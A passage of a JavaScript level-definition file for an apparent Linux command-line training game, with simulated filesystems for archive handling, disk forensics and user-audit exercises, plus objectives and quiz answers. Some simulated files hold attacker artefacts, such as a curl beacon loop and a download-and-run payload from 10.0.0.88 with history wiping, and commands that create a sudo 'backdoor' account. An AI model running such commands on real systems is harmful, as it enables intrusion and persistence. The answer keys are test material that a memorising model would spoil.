                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 8192,
                    content: '[SUID BINARY - Privilege escalation backdoor]'
                },
                '/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
                    children: ['.cache', '.hidden', 'beacon.sh']
                },
                '/tmp/.cache': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['rootshell']
                },
                '/tmp/.cache/rootshell': {
                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 16384,
                    content: '[SUID BACKDOOR in /tmp - HIGHLY SUSPICIOUS]'
                },
                '/tmp/.hidden': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['exfil.tar', 'keylogger']
                },
                '/tmp/beacon.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'mole', group: 'mole', size: 256,
                    content: '#!/bin/bash\nwhile true; do curl -s http://10.0.0.88/beacon; sleep 300; done'
                },
                '/var/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
                    children: ['privesc']
                },
                '/var/tmp/privesc': {
                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 4096,
                    content: '[PRIVILEGE ESCALATION TOOL]'
                },
            },

            objectives: [
                { id: 1, task: 'HUNT: Hidden Dot-Files', hint: '$ find /home -name ".*" -type f',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-name') && cmd.includes('.*') &&
                         output && (output.includes('.') || output.includes('No matches'))  },
                { id: 2, task: 'LOCATE: SUID Backdoors', hint: '$ find / -perm -4000 2>/dev/null',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('4000') &&
                         output && (output.includes('rws') || output.includes('/')) },
                { id: 3, task: 'SEARCH: Temp Directory Drops', hint: '$ find /tmp -type f',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('/tmp') &&
                         output && (output.includes('/tmp') || output.includes('beacon') || output.includes('No matches')) },
                { id: 4, task: 'TRACK: Recent Modifications', hint: '$ find / -mtime -1 -type f 2>/dev/null',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-mtime') },
                { id: 5, task: 'VERIFY: Binary Locations', hint: '$ which sudo && whereis bash',
                  check: (cmd, state, output) => (cmd.includes('which') || cmd.includes('whereis')) &&
                         output && output.includes('/') },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "What port does the analyst's backdoor connect to?",
                hint: "Read the .backdoor.sh file in /home/analyst to see the C2 connection details.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['4444', 'port 4444'],
                correctAnswerMessage: 'Intel confirmed. Backdoor on port 4444 — reverse shell to mole C2 at 10.0.0.88 identified.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-018: Archive Operations
        // Theme: Dead drop - extracting and packaging intel
        // ──────────────────────────────────────────────────────────
        'CLH-018': {
            title: 'Archive Operations',
            description: 'Extract intel packages from dead drops and prepare them for exfiltration.',
            prerequisites: ['CLH-017'],
            tier: 'CLI Specter',
            user: 'courier',
            hostname: 'DEAD-DROP',
            startDir: '/home/courier',
            allowedCommands: null,

            filesystem: {
                '/home/courier': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['incoming', 'outgoing', 'staging', 'logs', '.bash_history', '.archive_cheatsheet']
                },
                '/home/courier/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'courier', group: 'courier', size: 256,
                    content: `ls -la incoming/
tar -tzf incoming/package_alpha.tar.gz
tar -xzf archive.tar.gz -C /destination/
tar -czf output.tar.gz source_dir/
gzip -t file.tar.gz
md5sum file.tar.gz`
                },
                '/home/courier/.archive_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 789,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          ARCHIVE OPERATIONS CHEATSHEET                        ║
╚═══════════════════════════════════════════════════════════════╝

TAR OPERATIONS
──────────────
tar -czf archive.tar.gz dir/    Create gzipped tarball
tar -xzf archive.tar.gz         Extract gzipped tarball
tar -tzf archive.tar.gz         List contents (don't extract)
tar -xzf archive.tar.gz -C dir/ Extract to specific directory

COMPRESSION
───────────
gzip file                       Compress file (replaces original)
gunzip file.gz                  Decompress file
gzip -t file.gz                 Test integrity
gzip -l file.gz                 List compression info

ZIP OPERATIONS
─────────────
zip -r archive.zip dir/         Create zip archive
unzip archive.zip               Extract zip
unzip -l archive.zip            List contents

INTEGRITY CHECKS
───────────────
md5sum file                     Generate MD5 hash
sha256sum file                  Generate SHA256 hash
md5sum -c checksums.md5         Verify against checksum file`
                },
                '/home/courier/incoming': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['package_alpha.tar.gz', 'package_beta.zip', 'encrypted_bundle.tar.gpg', 'README.txt']
                },
                '/home/courier/incoming/package_alpha.tar.gz': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 2097152,
                    content: '[COMPRESSED ARCHIVE - tar.gz format]\nContents: intel_report.pdf, asset_photos/, communications.log'
                },
                '/home/courier/incoming/package_beta.zip': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 1048576,
                    content: '[COMPRESSED ARCHIVE - zip format]\nContents: surveillance_photos/, target_profiles.xlsx'
                },
                '/home/courier/incoming/encrypted_bundle.tar.gpg': {
                    type: 'file', perms: '-rw-------', owner: 'courier', group: 'courier', size: 4194304,
                    content: '[GPG ENCRYPTED ARCHIVE - Requires handler key]\nPassword hint: Operation codename + year'
                },
                '/home/courier/incoming/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 312,
                    content: 'DEAD DROP INSTRUCTIONS\n======================\n1. Verify packages with checksums\n2. Extract to staging area\n3. Repackage for exfiltration\n4. Leave no traces\n\nHandler codename: RAVEN\nDrop schedule: 0300 UTC daily'
                },
                '/home/courier/outgoing': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['checksums.md5']
                },
                '/home/courier/outgoing/checksums.md5': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 128,
                    content: '# Outgoing package checksums\n# Generate with: md5sum file >> checksums.md5'
                },
                '/home/courier/staging': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['manifest.txt', 'priority.txt']
                },
                '/home/courier/staging/manifest.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 256,
                    content: 'DEAD DROP MANIFEST\n==================\nPackage Alpha: SIGINT intercepts\nPackage Beta: Asset photographs\nEncrypted Bundle: HUMINT reports\n\nPriority: ALPHA (extract first)\nHandler: RAVEN'
                },
                '/home/courier/staging/priority.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 178,
                    content: 'EXTRACTION PRIORITY\n===================\n1. package_alpha.tar.gz - SIGINT (HIGH)\n2. package_beta.zip - PHOTOS (MEDIUM)\n3. encrypted_bundle - HUMINT (HANDLER ONLY)'
                },
                '/home/courier/logs': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['transfer.log', 'activity.log']
                },
                '/home/courier/logs/transfer.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 456,
                    content: '2024-01-15 03:00 RECV package_alpha.tar.gz from DROP_01\n2024-01-15 03:02 RECV package_beta.zip from DROP_02\n2024-01-15 03:05 RECV encrypted_bundle.tar.gpg from DROP_03\n2024-01-15 03:10 VERIFY all packages intact'
                },
                '/home/courier/logs/activity.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 234,
                    content: 'Session started: 2024-01-15 03:00 UTC\nOperator: courier\nMission: DEAD DROP RETRIEVAL\nStatus: PACKAGES AWAITING PROCESSING'
                },
                '/var/dead-drops': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
                    children: ['drop_01', 'drop_02', 'drop_03']
                },
                '/var/dead-drops/drop_01': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
                    children: ['status.txt']
                },
                '/var/dead-drops/drop_01/status.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'courier', size: 89,
                    content: 'DROP 01 STATUS: CLEARED\nLast pickup: 2024-01-15 03:00 UTC\nNext scheduled: 2024-01-16 03:00 UTC'
                },
                '/var/dead-drops/drop_02': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
                    children: ['status.txt']
                },
                '/var/dead-drops/drop_02/status.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'courier', size: 89,
                    content: 'DROP 02 STATUS: CLEARED\nLast pickup: 2024-01-15 03:02 UTC\nNext scheduled: 2024-01-16 03:00 UTC'
                },
                '/var/dead-drops/drop_03': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
                    children: ['status.txt']
                },
                '/var/dead-drops/drop_03/status.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'courier', size: 89,
                    content: 'DROP 03 STATUS: CLEARED\nLast pickup: 2024-01-15 03:05 UTC\nNext scheduled: 2024-01-16 03:00 UTC'
                },
            },

            objectives: [
                { id: 1, task: 'LIST: Incoming Packages', hint: '$ ls -la incoming/',
                  check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('incoming') &&
                         output && (output.includes('package_alpha') || output.includes('tar.gz')) },
                { id: 2, task: 'INSPECT: Archive Contents', hint: '$ tar -tzf incoming/package_alpha.tar.gz',
                  check: (cmd, state, output) => cmd.includes('tar') && (cmd.includes('-t') || cmd.includes('--list')) &&
                         output && (output.includes('intel') || output.includes('Contents')) },
                { id: 3, task: 'EXTRACT: Intel Package', hint: '$ tar -xzf incoming/package_alpha.tar.gz -C staging/',
                  check: (cmd, state, output) => cmd.includes('tar') && (cmd.includes('-x') || cmd.includes('--extract')) &&
                         output && (output.includes('Extracted') || output.includes('staging')) },
                { id: 4, task: 'CREATE: Exfil Package', hint: '$ tar -czf outgoing/exfil.tar.gz staging/',
                  check: (cmd, state, output) => cmd.includes('tar') && (cmd.includes('-c') || cmd.includes('--create')) &&
                         output && (output.includes('Created') || output.includes('outgoing')) },
                { id: 5, task: 'VERIFY: Package Integrity', hint: '$ gzip -t outgoing/exfil.tar.gz',
                  check: (cmd, state, output) => ((cmd.includes('gzip') && cmd.includes('-t')) || cmd.includes('md5sum') || cmd.includes('sha256sum')) &&
                         output && (output.includes('OK') || output.includes('intact') || /[a-f0-9]{32}/.test(output)) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the handler's codename for this dead drop operation?",
                hint: "Check the manifest.txt or README.txt in the staging or incoming directories.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['RAVEN', 'raven', 'Raven'],
                correctAnswerMessage: 'Intel confirmed. Handler RAVEN controls this dead drop circuit — drop schedule 0300 UTC daily.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-019: Disk Forensics
        // Theme: Evidence lab - analyzing disk images
        // ──────────────────────────────────────────────────────────
        'CLH-019': {
            title: 'Disk Forensics',
            description: 'Analyze disk images in the forensics lab to extract evidence.',
            prerequisites: ['CLH-018'],
            tier: 'CLI Specter',
            user: 'forensics',
            hostname: 'EVIDENCE-LAB',
            startDir: '/home/forensics',
            allowedCommands: null,

            filesystem: {
                '/home/forensics': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['cases', 'tools', 'reports', '.bash_history', '.forensics_cheatsheet']
                },
                '/home/forensics/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'forensics', group: 'forensics', size: 234,
                    content: `df -h
lsblk
du -sh /mnt/evidence/*
find /mnt/evidence -size +1M -type f
grep -r "DELETED" /mnt/evidence/
file disk.img`
                },
                '/home/forensics/.forensics_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 856,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          DISK FORENSICS CHEATSHEET                            ║
╚═══════════════════════════════════════════════════════════════╝

DISK ANALYSIS
─────────────
df -h                           Show filesystem space usage
lsblk                           List block devices
fdisk -l                        Show partition tables
blkid                           Show block device attributes

SIZE ANALYSIS
────────────
du -sh /path                    Directory size (human readable)
du -sh /path/*                  Size of each item in directory
du -ah /path | sort -rh | head  Find largest files

FILE HUNTING
───────────
find /path -size +1M            Files larger than 1MB
find /path -size +100M          Files larger than 100MB
find /path -type f -name "*.log" Find by extension
find /path -mtime -7            Modified in last 7 days

CONTENT SEARCH
─────────────
grep -r "pattern" /path         Recursive search
grep -l "pattern" /path/*       List files containing pattern
strings file.img | grep -i pass Extract strings, find passwords

IMAGE ANALYSIS
─────────────
file image.img                  Identify file type
xxd image.img | head            Hex dump first bytes
mount -o loop image.img /mnt    Mount disk image`
                },
                '/home/forensics/cases': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['case_2024_001', 'case_2024_002']
                },
                '/home/forensics/cases/case_2024_001': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['disk.img', 'memory.dmp', 'notes.txt', 'chain_of_custody.txt']
                },
                '/home/forensics/cases/case_2024_001/disk.img': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 1073741824,
                    content: '[RAW DISK IMAGE - 1GB]\nAcquired: 2024-01-10 14:30 UTC\nMethod: dd if=/dev/sda of=disk.img\nHash: SHA256:a3f2b8c9d4e5f6...'
                },
                '/home/forensics/cases/case_2024_001/memory.dmp': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 4294967296,
                    content: '[MEMORY DUMP - 4GB]\nAcquired during live response\nContains process memory, network connections'
                },
                '/home/forensics/cases/case_2024_001/notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 512,
                    content: 'CASE 2024-001: Compromised Workstation\n=====================================\nSuspect: Unknown threat actor\nEvidence: Full disk image acquired\nObjective: Recover deleted files and timeline\nCase Officer: SPECTER\n'
                },
                '/home/forensics/cases/case_2024_001/chain_of_custody.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 345,
                    content: 'CHAIN OF CUSTODY\n================\n2024-01-10 14:30 - Image acquired by Field Agent FALCON\n2024-01-10 16:00 - Transferred to Evidence Lab\n2024-01-10 16:15 - Received by Analyst FORENSICS\n2024-01-10 16:30 - Mounted for analysis'
                },
                '/home/forensics/cases/case_2024_002': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['usb.img', 'notes.txt']
                },
                '/home/forensics/cases/case_2024_002/usb.img': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 16106127360,
                    content: '[USB DRIVE IMAGE - 16GB]\nSuspected exfiltration device'
                },
                '/home/forensics/cases/case_2024_002/notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 289,
                    content: 'CASE 2024-002: Insider Threat\n=============================\nSuspect: Former employee\nEvidence: USB drive found in desk\nObjective: Recover deleted documents'
                },
                '/home/forensics/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['recover.sh', 'timeline.py', 'hash_verify.sh']
                },
                '/home/forensics/tools/recover.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'forensics', group: 'forensics', size: 256,
                    content: '#!/bin/bash\n# File recovery script\necho "Scanning for deleted files..."\nfind /mnt/evidence -name "*.deleted" -o -name "*~"'
                },
                '/home/forensics/tools/timeline.py': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'forensics', group: 'forensics', size: 512,
                    content: '#!/usr/bin/env python3\n# Timeline generation tool\n# Usage: python timeline.py /mnt/evidence > timeline.csv'
                },
                '/home/forensics/tools/hash_verify.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'forensics', group: 'forensics', size: 178,
                    content: '#!/bin/bash\n# Verify evidence integrity\nsha256sum "$1"\necho "Compare with chain of custody hash"'
                },
                '/home/forensics/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['template.txt']
                },
                '/home/forensics/reports/template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 234,
                    content: 'FORENSIC ANALYSIS REPORT\n========================\nCase Number: \nAnalyst: \nDate: \nEvidence Hash: \nFindings:\n\nConclusion:\n'
                },
                '/mnt': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['evidence']
                },
                '/mnt/evidence': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['home', 'var', 'tmp']
                },
                '/mnt/evidence/home': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['suspect']
                },
                '/mnt/evidence/home/suspect': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['.bash_history', 'Documents', 'Downloads']
                },
                '/mnt/evidence/home/suspect/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'forensics', size: 456,
                    content: 'curl -o /tmp/payload.sh http://10.0.0.88/mal.sh\nchmod +x /tmp/payload.sh\n/tmp/payload.sh\nrm -rf /tmp/payload.sh\nhistory -c'
                },
                '/mnt/evidence/home/suspect/Documents': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['DELETED_confidential.docx', 'meeting_notes.txt']
                },
                '/mnt/evidence/home/suspect/Documents/DELETED_confidential.docx': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'forensics', size: 524288,
                    content: '[DELETED FILE RECOVERED]\nClassified project documentation\nMarked for exfiltration'
                },
                '/mnt/evidence/home/suspect/Documents/meeting_notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'forensics', size: 234,
                    content: 'Meeting with handler: 2024-01-08\nDrop location: parking garage B3\nPayment: Bitcoin wallet provided'
                },
                '/mnt/evidence/var': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['log']
                },
                '/mnt/evidence/var/log': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['auth.log', 'syslog']
                },
                '/mnt/evidence/var/log/auth.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'forensics', size: 2048,
                    content: 'Jan 8 02:15:00 workstation sshd: Accepted password for suspect from 10.0.0.88\nJan 8 02:15:30 workstation sudo: suspect : TTY=pts/0 ; COMMAND=/bin/bash'
                },
                '/mnt/evidence/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'forensics',
                    children: ['.hidden_cache']
                },
                '/mnt/evidence/tmp/.hidden_cache': {
                    type: 'dir', perms: 'drwx------', owner: 'root', group: 'forensics',
                    children: ['exfil_staging.tar.gz']
                },
                '/mnt/evidence/tmp/.hidden_cache/exfil_staging.tar.gz': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'forensics', size: 52428800,
                    content: '[LARGE FILE - 50MB]\nStaged for exfiltration\nContains classified documents'
                },
            },

            objectives: [
                { id: 1, task: 'SURVEY: Available Disk Space', hint: '$ df -h',
                  check: (cmd, state, output) => cmd.includes('df') &&
                         output && (output.includes('Filesystem') || output.includes('Size') || output.includes('/dev')) },
                { id: 2, task: 'LIST: Block Devices', hint: '$ lsblk',
                  check: (cmd, state, output) => cmd.includes('lsblk') &&
                         output && (output.includes('NAME') || output.includes('disk') || output.includes('sda')) },
                { id: 3, task: 'CHECK: Disk Usage', hint: '$ du -sh /mnt/evidence/*',
                  check: (cmd, state, output) => cmd.includes('du') && cmd.includes('evidence') &&
                         output && (/\d/.test(output) || output.includes('home') || output.includes('var')) },
                { id: 4, task: 'FIND: Large Files', hint: '$ find /mnt/evidence -size +1M -type f',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-size') &&
                         output && (output.includes('/mnt') || output.includes('evidence') || output.includes('No matches')) },
                { id: 5, task: 'SEARCH: Deleted Markers', hint: '$ grep -r "DELETED" /mnt/evidence/',
                  check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('evidence') &&
                         output && (output.includes('DELETED') || output.includes('confidential') || output.includes('No matches')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the case officer's codename for case 2024-001?",
                hint: "Check the notes.txt file in the case_2024_001 directory.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['SPECTER', 'specter', 'Specter'],
                correctAnswerMessage: 'Intel confirmed. Case Officer SPECTER assigned to case 2024-001 — compromised workstation investigation.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-020: User Reconnaissance
        // Theme: Profiling users on a compromised system
        // ──────────────────────────────────────────────────────────
        'CLH-020': {
            title: 'User Reconnaissance',
            description: 'Profile user accounts and privileges on a compromised system.',
            prerequisites: ['CLH-019'],
            tier: 'CLI Specter',
            user: 'auditor',
            hostname: 'BLACKSITE-7',
            startDir: '/home/auditor',
            allowedCommands: null,

            filesystem: {
                '/home/auditor': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
                    children: ['audit_logs', 'reports', 'notes', '.bash_history', '.user_recon_cheatsheet']
                },
                '/home/auditor/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'auditor', group: 'auditor', size: 234,
                    content: `whoami
id
cat /etc/passwd
grep sudo /etc/group
last
cat /etc/sudoers
sudo -l`
                },
                '/home/auditor/.user_recon_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 856,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          USER RECONNAISSANCE CHEATSHEET                       ║
╚═══════════════════════════════════════════════════════════════╝

IDENTITY
────────
whoami                      Current username
id                          UID, GID, and groups
hostname                    System hostname
uname -a                    Full system info

USER ENUMERATION
───────────────
cat /etc/passwd             All user accounts
cat /etc/shadow             Password hashes (need root)
cat /etc/group              All groups
getent passwd username      Specific user details

PRIVILEGE ANALYSIS
─────────────────
grep sudo /etc/group        Users in sudo group
cat /etc/sudoers            Sudo configuration
sudo -l                     Current user's sudo rights
find / -perm -4000          SUID binaries

LOGIN HISTORY
────────────
last                        Recent logins
lastlog                     Last login per user
who                         Currently logged in
w                           Logged in + activity

SUSPICIOUS INDICATORS
────────────────────
- New users created recently
- Users added to sudo/admin groups
- Users with UID 0 (root equivalent)
- Users with /bin/bash shell`
                },
                '/home/auditor/audit_logs': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
                    children: ['user_activity.log', 'privilege_changes.log']
                },
                '/home/auditor/audit_logs/user_activity.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 567,
                    content: `2024-01-14 02:30:15 admin logged in from 192.168.1.100
2024-01-14 02:31:00 admin executed: sudo useradd -m backdoor
2024-01-14 02:31:30 admin executed: sudo passwd backdoor
2024-01-14 02:32:00 admin executed: sudo usermod -aG sudo backdoor
2024-01-14 03:00:00 backdoor logged in from 10.0.0.88
2024-01-14 03:00:30 backdoor executed: sudo -i`
                },
                '/home/auditor/audit_logs/privilege_changes.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 345,
                    content: `PRIVILEGE ESCALATION EVENTS
============================
2024-01-14 02:32:00 USER backdoor ADDED TO GROUP sudo BY admin
2024-01-14 03:00:30 USER backdoor GAINED ROOT SHELL

ALERT: Unauthorized privilege escalation detected!`
                },
                '/home/auditor/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
                    children: ['template.txt']
                },
                '/home/auditor/reports/template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 234,
                    content: 'USER AUDIT REPORT\n=================\nDate: \nAuditor: \nFindings:\n\nSuspicious Accounts:\n\nRecommendations:\n'
                },
                '/home/auditor/notes': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
                    children: ['investigation.txt']
                },
                '/home/auditor/notes/investigation.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 378,
                    content: 'INVESTIGATION NOTES\n===================\nSuspect Account: backdoor\nCreated: 2024-01-14 02:31:00\nCreated By: admin (compromised?)\nPrivileges: sudo group member\nFirst Login: 2024-01-14 03:00:00 from 10.0.0.88\n\nACTION REQUIRED: Disable account and investigate admin'
                },
                '/home/admin': {
                    type: 'dir', perms: 'drwx------', owner: 'admin', group: 'admin',
                    children: ['.ssh', 'scripts', '.bash_history']
                },
                '/home/admin/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 1024,
                    content: 'sudo useradd -m backdoor\nsudo passwd backdoor\nsudo usermod -aG sudo backdoor\nhistory -c'
                },
                '/home/admin/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'admin', group: 'admin',
                    children: ['authorized_keys']
                },
                '/home/admin/.ssh/authorized_keys': {
                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 512,
                    content: '# Authorized keys for admin\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... admin@workstation\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... UNKNOWN@10.0.0.88  # SUSPICIOUS'
                },
                '/home/admin/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['backup.sh']
                },
                '/home/admin/scripts/backup.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 256,
                    content: '#!/bin/bash\n# System backup script\ntar -czf /backup/system_$(date +%Y%m%d).tar.gz /etc /home'
                },
                '/home/sysadmin': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'sysadmin', group: 'sysadmin',
                    children: ['.ssh', 'maintenance', '.bash_history']
                },
                '/home/sysadmin/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'sysadmin', group: 'sysadmin', size: 178,
                    content: 'systemctl status sshd\njournalctl -u sshd\ncat /var/log/auth.log'
                },
                '/home/sysadmin/maintenance': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'sysadmin', group: 'sysadmin',
                    children: ['health_check.sh']
                },
                '/home/sysadmin/maintenance/health_check.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'sysadmin', group: 'sysadmin', size: 312,
                    content: '#!/bin/bash\necho "=== SYSTEM HEALTH ==="\nuptime\nfree -h\ndf -h'
                },
                '/home/backdoor': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'backdoor', group: 'backdoor',
                    children: ['.bashrc', 'tools', '.bash_history']
                },
                '/home/backdoor/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'backdoor', group: 'backdoor', size: 456,
                    content: 'sudo -i\ncat /etc/shadow\nwhoami\nid\ncat /etc/passwd | grep root'
                },
                '/home/backdoor/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'backdoor', group: 'backdoor',
                    children: ['enum.sh']
                },
                '/home/backdoor/tools/enum.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'backdoor', group: 'backdoor', size: 289,
                    content: '#!/bin/bash\n# User enumeration script\necho "=== USERS ==="\ncat /etc/passwd\necho "=== SUDO USERS ==="\ngrep sudo /etc/group'
                },
            },

            objectives: [
                { id: 1, task: 'IDENTIFY: Current User', hint: '$ whoami && id',
                  check: (cmd, state, output) => (cmd.includes('whoami') || cmd.includes('id')) &&
                         output && (output.includes('auditor') || output.includes('uid=')) },
                { id: 2, task: 'LIST: All Users', hint: '$ cat /etc/passwd',
                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('passwd') &&
                         output && (output.includes('root') || output.includes('/bin/bash') || output.includes(':x:')) },
                { id: 3, task: 'FIND: Privileged Users', hint: '$ grep sudo /etc/group',
                  check: (cmd, state, output) => cmd.includes('grep') && (cmd.includes('sudo') || cmd.includes('group')) &&
                         output && (output.includes('sudo') || output.includes('backdoor') || output.includes('admin')) },
                { id: 4, task: 'CHECK: Login History', hint: '$ last',
                  check: (cmd, state, output) => (cmd.includes('last')) &&
                         output && (output.includes('pts') || output.includes('logged') || output.includes('still')) },
                { id: 5, task: 'AUDIT: Sudoers', hint: '$ cat /etc/sudoers 2>/dev/null || sudo -l',
                  check: (cmd, state, output) => (cmd.includes('sudoers') || cmd.includes('sudo -l')) &&
                         output && (output.includes('ALL') || output.includes('NOPASSWD') || output.includes('sudo')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the username of the suspicious account created by the attacker?",
                hint: "Check the audit_logs directory or admin's bash_history for recently created accounts.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['backdoor', 'BACKDOOR', 'Backdoor'],
                correctAnswerMessage: 'Intel confirmed. Account "backdoor" created by compromised admin — added to sudo group for persistent access.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-021: SSH Operations
